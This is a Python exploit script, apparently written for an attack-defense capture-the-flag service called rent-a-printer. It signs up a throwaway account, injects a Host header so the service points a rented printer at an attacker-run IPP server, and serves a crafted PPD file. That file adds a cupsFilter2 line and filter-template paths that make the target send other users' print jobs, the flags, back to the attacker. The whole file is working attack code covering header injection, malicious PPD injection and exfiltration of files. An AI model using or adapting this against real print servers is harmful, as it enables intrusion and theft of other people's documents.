import random
import socket
import string
import sys
import time
from pathlib import Path

sys.path.append(str(Path(__file__).absolute().parent.parent))
sys.path.append(str(Path(__file__).absolute().parent.parent / 'service'))

from exploits.evilprinter import StdoutPrinter, host_printer_in_background
from exploits.lib import ServiceSession, MyIppClient


class EvilPrinter(StdoutPrinter):
    """A printer that returns additional ppd lines on its ppd endpoint"""

    def __init__(self, name, custom_ppd: list[str] = []) -> None:
        super().__init__(name)
        self.custom_ppd = custom_ppd

    def get_ppd(self) -> str:
        return super().get_ppd() + '\n' + '\n'.join(self.custom_ppd) + '\n'


def get_my_ip(target: str) -> str:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect((target, 631))
        return s.getsockname()[0]
    finally:
        s.close()


def exploit(target: str, flag_ids: list[str]):
    username = ''.join(random.choice(string.ascii_letters) for _ in range(16))
    password = ''.join(random.choice(string.ascii_letters) for _ in range(16))
    printername = ''.join(random.choice(string.ascii_letters) for _ in range(12))
    printername_complete = username + '-' + printername
    print(username, password, printername)

    custom_ppd = [
        '*cupsFilter2: "application/vnd.cups-pdf application/pdf 0 add_template.py"'
    ]
    for target_username in flag_ids:
        custom_ppd.append(f'*saarsecFilterTemplate: /home/rent-a-printer/data/{target_username}/job-00001.pdf')
    printer = EvilPrinter(name=printername_complete, custom_ppd=custom_ppd)
    port = random.randint(10000, 65000)
    host_printer_in_background(printer, port)

    session = ServiceSession(f'http://{target}:6310/')
    # inject Host header, which ends up in the printer's backend URL
    # => redirect print requests to this server
    # => read ppd from this script's server
    session.session.headers['Host'] = f'{get_my_ip(target)}:{port}'
    assert session.signup(username, password), 'cannot signup'
    session.rent_printer(printername, [], [])
    print('registered printer')

    time.sleep(1)

    # print empty document
    ippclient = MyIppClient(f'ipp://{target}:631/printers/{printername_complete}')
    result = ippclient.print_job('text/plain', 'test.txt', b'X')
    print('Job dispatched:', result)

    # wait for flags to arrive at our printer
    time.sleep(10)


if __name__ == '__main__':
    exploit(sys.argv[1], sys.argv[2].split(','))
